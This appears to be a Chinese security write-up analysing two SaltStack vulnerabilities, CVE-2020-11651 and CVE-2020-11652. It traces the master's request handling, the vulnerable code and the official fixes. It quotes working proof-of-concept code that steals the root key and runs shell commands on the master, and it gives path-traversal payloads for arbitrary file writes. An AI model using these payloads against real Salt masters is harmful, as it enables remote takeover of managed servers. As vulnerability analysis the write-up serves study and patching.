@@ -1,0 +1,332 @@
+SaltStack是一种基于C/S架构的服务器基础架构集中管理平台，最近披露出存在两个安全漏洞 CVE-2020-11651
+权限缺陷、CVE-2020-11652 任意文件读写漏洞，官方公告[SALT 3000.2 RELEASE
+NOTES](https://docs.saltstack.com/en/latest/topics/releases/3000.2.html),
+两个CVE漏洞可以造成远程命令执行。Ghost 使用SaltStack管理自身的机器，漏洞披露后被恶意入侵并植入挖矿程序，Ghost的安全公告  
+[Critical vulnerability impacting all services](https://status.ghost.org)  
+受影响的version
+  * CVE-2020-11651
+    * SaltStack Salt before 2019.2.4 and 3000 before 3000.2
+  * CVE-2020-11652
+    * SaltStack Salt before 2019.2.4 and 3000 before 3000.2
+## 0x00 CVE-2020-11651
+官方公告对其描述
+    The salt-master process ClearFuncs class does not properly validate method calls. This allows a remote user to access some methods without authentication. These methods can be used to retrieve user tokens from the salt master and/or run arbitrary commands on salt minions.
+### POC
+现有已公开[POC](https://github.com/dozernz/cve-2020-11651/blob/master/CVE-2020-11651.py)核心逻辑
+    def get_rootkey():
+        try:
+            response = clear_channel.send({'cmd':'_prep_auth_info'}, timeout=2)
+            for i in response:
+                if isinstance(i,dict) and len(i) == 1:
+                    rootkey = list(i.values())[0]
+                    print("Retrieved root key: " + rootkey)
+                    return rootkey
+            return False
+        except:
+            return False
+获取对应的rootkey后续可执行恶意命令达到远程命令执行目的
+    def master_shell(root_key,command):
+        # This is achieved by using the stolen key to create a "runner" on the master node using the cmdmod module, then the cmd.exec_code function to run some python3 code that shells out.
+        # There is a cmd.shell function but I wasn't able to get it to accept the "cmd" kwarg parameter for some reason.
+        # It's also possible to use CVE-2020-11652 to get shell if the master instance is running as root by writing a crontab into a cron directory, or proably some other ways.
+        # This way is nicer though, and doesn't need the master to be running as root .
+        msg = {"key":root_key,
+                "cmd":"runner",
+                'fun': 'salt.cmd',
+                "kwarg":{
+                    "fun":"cmd.exec_code",
+                    "lang":"python3",
+                    "code":"import subprocess;subprocess.call('{}',shell=True)".format(command)
+                    },
+                'jid': '20200504042611133934',
+                'user': 'sudo_user',
+                '_stamp': '2020-05-04T04:26:13.609688'}
+        try:
+            response = clear_channel.send(msg,timeout=3)
+            print("Got response for attempting master shell: "+str(response)+ ". Looks promising!")
+            return True
+        except:
+            print("something failed")
+            return False
+poc调用salt packages 分析
+    clear_channel = salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')
+    ->
+    response = clear_channel.send({'cmd': '_prep_auth_info'}, timeout=2)
+    /salt/transport/zeromq.py
+    @salt.ext.tornado.gen.coroutine
+        def send(self, load, tries=3, timeout=60, raw=False):
+            '''
+            Send a request, return a future which will complete when we send the message
+            '''
+            if self.crypt == 'clear':
+                ret = yield self._uncrypted_transfer(load, tries=tries, timeout=timeout)
+            else:
+                ret = yield self._crypted_transfer(load, tries=tries, timeout=timeout, raw=raw)
+            raise salt.ext.tornado.gen.Return(ret)
+salt.transport.client.ReqChannel.factory
+最后被实例化为AsyncZeroMQReqChannel，而且带有clear参数，即发给master的命令是clear没有AES加密的
+### SaltStack master端逻辑
+SaltStack
+逻辑非常复杂，只对涉及漏洞及其利用点的master端工作流程做简单梳理，可以结合SaltStack官方[doc](https://docs.saltstack.com/en/latest/topics/development/architecture.html#job-flow)梳理
+    提交任务 -> ReqServer(TCP:PORT:4506) -> MWorker -> workers.ipc -> auth -> Publisher -> EventPulisher
+根据官方描述 ClearFuncs class 没有正确校验调用的method，即发生在 woker认领任务并发送publish命令处，结合POC在salt
+packages的调用流程
+    salt/master.py
+    class ReqServer(salt.utils.process.SignalHandlingProcess):
+        def __bind(self):
+启动主server及生成相应数量的woker线程
+    salt/master.py
+    class MWorker(salt.utils.process.SignalHandlingProcess):
+            def __bind(self):
+            """
+            Bind to the local port
+            """
+            # using ZMQIOLoop since we *might* need zmq in there
+            install_zmq()
+            self.io_loop = ZMQDefaultLoop()
+            self.io_loop.make_current()
+            for req_channel in self.req_channels:
+                req_channel.post_fork(
+                    self._handle_payload, io_loop=self.io_loop
+                )  # TODO: cleaner? Maybe lazily?
+            try:
+                self.io_loop.start()
+            except (KeyboardInterrupt, SystemExit):
+                # Tornado knows what to do
+                pass
+通过_bind方法来绑定端口并接受请求，建立多进程模型
+    salt/master.py
+            req_channel.post_fork(
+                    self._handle_payload, io_loop=self.io_loop
+                )
+        @salt.ext.tornado.gen.coroutine
+        def _handle_payload(self, payload):
+            """
+            The _handle_payload method is the key method used to figure out what
+            needs to be done with communication to the server
+            Example cleartext payload generated for 'salt myminion test.ping':
+            {'enc': 'clear',
+             'load': {'arg': [],
+                      'cmd': 'publish',
+                      'fun': 'test.ping',
+                      'jid': '',
+                      'key': 'alsdkjfa.,maljf-==adflkjadflkjalkjadfadflkajdflkj',
+                      'kwargs': {'show_jid': False, 'show_timeout': False},
+                      'ret': '',
+                      'tgt': 'myminion',
+                      'tgt_type': 'glob',
+                      'user': 'root'}}
+            :param dict payload: The payload route to the appropriate handler
+            """
+            key = payload["enc"]
+            load = payload["load"]
+            ret = {"aes": self._handle_aes, "clear": self._handle_clear}[key](load)
+            raise salt.ext.tornado.gen.Return(ret)
+通过post_fork()传入self._handler_payload 任务处理函数，在_handle_payload()方法中可以看由于poc的send
+带有`'enc': 'clear' 'cmd': '_prep_auth_info'`，所以调用
+    def _handle_clear(self, load):
+            """
+            Process a cleartext command
+            :param dict load: Cleartext payload
+            :return: The result of passing the load to a function in ClearFuncs corresponding to
+                     the command specified in the load's 'cmd' key.
+            """
+            log.trace("Clear payload received with command %s", load["cmd"])
+            cmd = load["cmd"]
+            if cmd.startswith("__"):
+                return False
+            if self.opts["master_stats"]:
+                start = time.time()
+                self.stats[cmd]["runs"] += 1
+            ret = getattr(self.clear_funcs, cmd)(load), {"fun": "send_clear"}
+            if self.opts["master_stats"]:
+                self._post_stats(start, cmd)
+            return ret
+调用_prep_auth_info
+    def _prep_auth_info(self, clear_load):
+            sensitive_load_keys = []
+            key = None
+            if "token" in clear_load:
+                auth_type = "token"
+                err_name = "TokenAuthenticationError"
+                sensitive_load_keys = ["token"]
+            elif "eauth" in clear_load:
+                auth_type = "eauth"
+                err_name = "EauthAuthenticationError"
+                sensitive_load_keys = ["username", "password"]
+            else:
+                auth_type = "user"
+                err_name = "UserAuthenticationError"
+                key = self.key
+            return auth_type, err_name, key, sensitive_load_keys
+返回rootkey
+### 修复代码
+[commit_id](https://github.com/saltstack/salt/pull/56987/commits/3fb1e4f6898ee756ab3bcd10ea374fd205f8d5d4)
+    method = self.clear_funcs.get_method(cmd)
+    '''
+    'enc': 'clear'
+    '''
+    class TransportMethods(object):
+        """
+        Expose methods to the transport layer, methods with their names found in
+        the class attribute 'expose_methods' will be exposed to the transport layer
+        via 'get_method'.
+        """
+        expose_methods = ()
+        def get_method(self, name):
+            """
+            Get a method which should be exposed to the transport layer
+            """
+            if name in self.expose_methods:
+                try:
+                    return getattr(self, name)
+                except AttributeError:
+                    log.error("Requested method not exposed: %s", name)
+            else:
+                log.error("Requested method not exposed: %s", name)
+    '''
+    'enc': 'aes'
+    '''
+    class AESFuncs(TransportMethods):
+        """
+        Set up functions that are available when the load is encrypted with AES
+        """
+        expose_methods = (
+            "verify_minion",
+            "_master_tops",
+            "_ext_nodes",
+            "_master_opts",
+            "_mine_get",
+            "_mine",
+            "_mine_delete",
+            "_mine_flush",
+            "_file_recv",
+            "_pillar",
+            "_minion_event",
+            "_handle_minion_event",
+            "_return",
+            "_syndic_return",
+            "_minion_runner",
+            "pub_ret",
+            "minion_pub",
+            "minion_publish",
+            "revoke_auth",
+            "run_func",
+            "_serve_file",
+            "_file_find",
+            "_file_hash",
+            "_file_find_and_stat",
+            "_file_list",
+            "_file_list_emptydirs",
+            "_dir_list",
+            "_symlink_list",
+            "_file_envs",
+        )
+限制传入的method
+## 0x01 CVE-2020-11652
+官方公告对其描述
+    The salt-master process ClearFuncs class allows access to some methods that improperly sanitize paths. These methods allow arbitrary directory access to authenticated users.
+### POC
+    SaltStack Test类
+        def test_clearfuncs_config(self):
+            clear_channel = salt.transport.client.ReqChannel.factory(
+                self.minion_config, crypt="clear"
+            )
+            msg = {
+                "key": self.key,
+                "cmd": "wheel",
+                "fun": "config.update_config",
+                "file_name": "../evil",
+                "yaml_contents": "win",
+            }
+            ret = clear_channel.send(msg, timeout=5)
+            assert not os.path.exists(
+                os.path.join(self.conf_dir, "evil.conf")
+            ), "Wrote file via directory traversal"
+    msg = {
+        'key': root_key,
+        'cmd': 'wheel',
+        'fun': 'file_roots.write',
+        'path': '../../../../../../../../tmp/salt_CVE_2020_11652',
+        'data': 'evil',
+      }
+    ret = clear_channel.send(msg, timeout=5)
+### 缺陷代码
+salt/wheel/file_roots.py
+    def write(data, path, saltenv="base", index=0):
+        """
+        Write the named file, by default the first file found is written, but the
+        index of the file can be specified to write to a lower priority file root
+        """
+        if saltenv not in __opts__["file_roots"]:
+            return "Named environment {0} is not present".format(saltenv)
+        if len(__opts__["file_roots"][saltenv]) <= index:
+            return "Specified index {0} in environment {1} is not present".format(
+                index, saltenv
+            )
+        if os.path.isabs(path):
+            return (
+                "The path passed in {0} is not relative to the environment " "{1}"
+            ).format(path, saltenv)
+        dest = os.path.join(__opts__["file_roots"][saltenv][index], path)
+使用os.path.isabs 判断是否是绝对路径，防止任意路径写入，但是被../绕过
+### 修复代码
+[commit_id](https://github.com/saltstack/salt/pull/56987/commits/0491a84361098a2862005cef8d0f6c9dd1e3bb73)  
+新增校验函数  
+salt/utils/verify.py
+    def _realpath(path):
+        """
+        Cross platform realpath method. On Windows when python 3, this method
+        uses the os.readlink method to resolve any filesystem links. On Windows
+        when python 2, this method is a no-op. All other platforms and version use
+        os.path.realpath
+        """
+        if salt.utils.platform.is_darwin():
+            return _realpath_darwin(path)
+        elif salt.utils.platform.is_windows():
+            if salt.ext.six.PY3:
+                return _realpath_windows(path)
+            else:
+                return path
+        return os.path.realpath(path)
+    def _realpath_darwin(path):
+        base = ""
+        for part in path.split(os.path.sep)[1:]:
+            if base != "":
+                if os.path.islink(os.path.sep.join([base, part])):
+                    base = os.readlink(os.path.sep.join([base, part]))
+                else:
+                    base = os.path.abspath(os.path.sep.join([base, part]))
+            else:
+                base = os.path.abspath(os.path.sep.join([base, part]))
+        return base
+## 0x02 Other-salt packages安装issue
+mac `python3 -m pip install salt`会报错
+    ext-date-lib/timelib_structs.h:24:10: fatal error: 'timelib_config.h' file not found
+        #include "timelib_config.h"
+                 ^~~~~~~~~~~~~~~~~~
+        1 error generated.
+        error: command 'clang' failed with exit status 1
+  * `python3 -m pip download timelib`
+  * 修改timelib的setup.py文件
+        setup(name="timelib",
+       version="0.2.4",
+       description="parse english textual date descriptions",
+       author="Ralf Schmitt",
+       author_email="PI:EMAIL",
+       url="https://github.com/pediapress/timelib/",
+       ext_modules=[Extension("timelib", sources=sources,
+                              libraries=libraries,
+                              include_dirs=[".", "ext-date-lib"],
+                              define_macros=[("HAVE_STRING_H", 1)])],
+       include_dirs=[".", "ext-date-lib"],
+       long_description=open("README.rst").read(),
+       license="zlib/php",
+       **extra)
+  * `python3 setup.py build`
+  * `python3 setup.py install`
+## 0x03 参考
+  * [github_poc-CVE-2020-11651](https://github.com/dozernz/cve-2020-11651/blob/master/CVE-2020-11651.py)
+  * 官方公告[SALT 3000.2 RELEASE NOTES](https://docs.saltstack.com/en/latest/topics/releases/3000.2.html)
+  * SaltStack官方[doc](https://docs.saltstack.com/en/latest/topics/development/architecture.html#job-flow)
+  * [timelib_Unable to install on OSX](https://github.com/pediapress/timelib/issues/6)
